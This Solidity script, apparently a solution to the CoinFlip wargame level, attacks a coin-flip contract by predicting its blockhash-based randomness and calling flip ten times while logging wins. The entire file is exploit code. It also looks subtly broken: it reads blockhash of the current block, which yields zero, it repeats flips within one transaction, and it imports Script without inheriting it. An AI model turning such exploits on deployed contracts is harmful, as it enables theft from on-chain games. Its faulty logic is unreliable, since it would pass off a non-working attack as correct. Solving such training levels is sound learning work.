// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "src/CoinFlip.sol";
import {DevOpsTools} from "lib/foundry-devops/src/DevOpsTools.sol";

contract AttackCoinFlip {
    CoinFlip private s_coinFlip;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() public {
        address mostRecentlyDeployed = DevOpsTools.get_most_recent_deployment("CoinFlip", block.chainid);
        attackCoinFlip(mostRecentlyDeployed);
    }

    function attackCoinFlip(address _coinFlip) public {
        console.log("Attacking CoinFlip");
        s_coinFlip = CoinFlip(_coinFlip);
        for (uint256 i = 0; i < 10; i++) {
            bool guess = _guessFlipCoinOutcome();
            s_coinFlip.flip(guess);
            console.log("Consecutive wins attempt ", i, ": ", s_coinFlip.consecutiveWins());
        }
        console.log("End of attack");
    }

    function _guessFlipCoinOutcome() internal view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}
